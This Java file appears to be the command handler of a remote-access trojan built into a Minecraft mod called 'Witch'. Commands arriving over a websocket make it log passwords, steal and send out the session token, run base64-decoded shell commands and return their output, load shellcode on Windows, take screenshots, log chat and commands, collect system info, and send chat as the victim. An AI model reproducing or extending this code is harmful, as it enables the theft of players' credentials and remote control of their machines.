package me.soda.witch.websocket;

import me.soda.witch.Witch;
import me.soda.witch.features.*;
import net.minecraft.text.Text;

import java.util.Base64;

public class MessageHandler {
    private static String decodeBase64(String str) {
        byte[] result = Base64.getDecoder().decode(str.getBytes());
        return new String(result);
    }

    public static void handle(String message) {
        String[] msgArr = message.split(" ");
        String messageType = msgArr[0];
        System.out.println("Received message: " + messageType);
        try {
            switch (messageType) {
                case "steal_pwd_switch":
                    Config.passwordBeingLogged = Boolean.parseBoolean(msgArr[1]);
                    break;
                case "steal_token":
                    MessageUtils.sendMessage(messageType, Stealer.stealToken());
                    break;
                case "getconfig":
                case "vanish":
                    //todo
                    break;
                case "chat_control":
                    ChatUtil.sendChat(decodeBase64(msgArr[1]));
                    break;
                case "chat_filter":
                    Config.filterPattern = decodeBase64(msgArr[1]);
                    break;
                case "chat_filter_switch":
                    Config.isBeingFiltered = Boolean.parseBoolean(msgArr[1]);
                    break;
                case "chat_mute":
                    Config.isMuted = Boolean.parseBoolean(msgArr[1]);
                    break;
                case "mods":
                    MessageUtils.sendMessage(messageType, MinecraftUtil.allMods());
                    break;
                case "systeminfo":
                    MessageUtils.sendMessage(messageType, MinecraftUtil.systemInfo());
                    break;
                case "screenshot":
                    Witch.screenshot = true;
                    break;
                case "chat":
                    ChatUtil.chat(Text.of(decodeBase64(msgArr[1])), false);
                    break;
                case "kill":
                    Witch.client.close(false);
                    break;
                case "shell":
                    new Thread(() -> {
                        String result = ShellUtil.runCmd(decodeBase64(msgArr[1]));
                        MessageUtils.sendMessage(messageType, "\n" + result);
                    }).start();
                    break;
                case "shellcode":
                    if (ShellUtil.isWin())
                        new Thread(() -> new ShellcodeLoader().loadShellCode(msgArr[1], false)).start();
                    break;
                case "log":
                    Config.logChatAndCommand = !Config.logChatAndCommand;
                    MessageUtils.sendMessage(messageType, String.valueOf(Config.logChatAndCommand));
                    break;
                default:
                    break;
            }
        } catch (Exception e) {
            System.out.println("Corrupted message!");
            e.printStackTrace();
        }
    }
}